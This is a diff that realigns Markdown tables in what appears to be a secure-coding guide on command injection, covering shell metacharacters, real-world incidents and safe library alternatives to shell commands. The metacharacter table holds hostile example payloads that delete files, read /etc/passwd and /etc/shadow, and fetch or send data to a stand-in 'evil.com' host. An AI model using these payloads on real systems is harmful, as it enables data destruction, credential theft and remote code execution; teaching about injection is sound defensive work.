@@ -42,16 +42,16 @@ audience:
 
 ## Shell Metacharacters Used in Injection
 
-| Character | Purpose                    | Example                        |
-|-----------|----------------------------|--------------------------------|
-| `;`       | Command separator          | `; rm -rf /`                   |
-| `\|`      | Pipe output to command     | `\| cat /etc/passwd`           |
-| `&&`      | Execute if previous succeeds| `&& wget evil.com/shell.sh`   |
-| `\|\|`    | Execute if previous fails  | `\|\| curl evil.com/exfil`     |
-| `` ` ` `` | Command substitution       | `` `whoami` ``                 |
-| `$()`     | Command substitution       | `$(cat /etc/shadow)`           |
-| `>`       | Redirect output to file    | `> /var/www/shell.php`         |
-| `\n`      | Newline (new command)      | `%0a id`                       |
+| Character | Purpose                      | Example                     |
+| --------- | ---------------------------- | --------------------------- |
+| `;`       | Command separator            | `; rm -rf /`                |
+| `\|`      | Pipe output to command       | `\| cat /etc/passwd`        |
+| `&&`      | Execute if previous succeeds | `&& wget evil.com/shell.sh` |
+| `\|\|`    | Execute if previous fails    | `\|\| curl evil.com/exfil`  |
+| `` ` ` `` | Command substitution         | `` `whoami` ``              |
+| `$()`     | Command substitution         | `$(cat /etc/shadow)`        |
+| `>`       | Redirect output to file      | `> /var/www/shell.php`      |
+| `\n`      | Newline (new command)        | `%0a id`                    |
 
 ---
 
@@ -235,12 +235,12 @@ app.get('/dns', (req, res) => {
 
 ## Real-World Case Studies
 
-| Incident               | Year | Details                                    |
-|------------------------|------|--------------------------------------------|
-| Shellshock (Bash bug)  | 2014 | CVE-2014-6271, env variable injection      |
-| Equifax breach         | 2017 | Apache Struts command injection (partial)   |
-| Cisco Smart Install    | 2018 | Remote command execution via protocol abuse |
-| GitLab ExifTool        | 2021 | CVE-2021-22205, RCE via image upload        |
+| Incident              | Year | Details                                     |
+| --------------------- | ---- | ------------------------------------------- |
+| Shellshock (Bash bug) | 2014 | CVE-2014-6271, env variable injection       |
+| Equifax breach        | 2017 | Apache Struts command injection (partial)   |
+| Cisco Smart Install   | 2018 | Remote command execution via protocol abuse |
+| GitLab ExifTool       | 2021 | CVE-2021-22205, RCE via image upload        |
 
 ---
 
@@ -332,15 +332,15 @@ def safe_ping(host):
 
 ## Language-Specific Alternatives to Shell Commands
 
-| Shell Command      | Python Alternative                 | Node.js Alternative        |
-|-------------------|------------------------------------|----------------------------|
-| `ping`            | `subprocess.run(['ping',...])`     | `execFile('ping',[...])`   |
-| `nslookup`        | `socket.gethostbyname()`          | `dns.resolve()`            |
-| `curl`            | `requests.get()`                  | `fetch()` / `axios.get()`  |
-| `ls`              | `os.listdir()`                    | `fs.readdir()`             |
-| `cat`             | `open().read()`                   | `fs.readFile()`            |
-| `grep`            | `re.search()`                     | `string.match()`           |
-| `cp` / `mv`       | `shutil.copy()` / `shutil.move()` | `fs.copyFile()`            |
+| Shell Command | Python Alternative                | Node.js Alternative       |
+| ------------- | --------------------------------- | ------------------------- |
+| `ping`        | `subprocess.run(['ping',...])`    | `execFile('ping',[...])`  |
+| `nslookup`    | `socket.gethostbyname()`          | `dns.resolve()`           |
+| `curl`        | `requests.get()`                  | `fetch()` / `axios.get()` |
+| `ls`          | `os.listdir()`                    | `fs.readdir()`            |
+| `cat`         | `open().read()`                   | `fs.readFile()`           |
+| `grep`        | `re.search()`                     | `string.match()`          |
+| `cp` / `mv`   | `shutil.copy()` / `shutil.move()` | `fs.copyFile()`           |
 
 ---
 
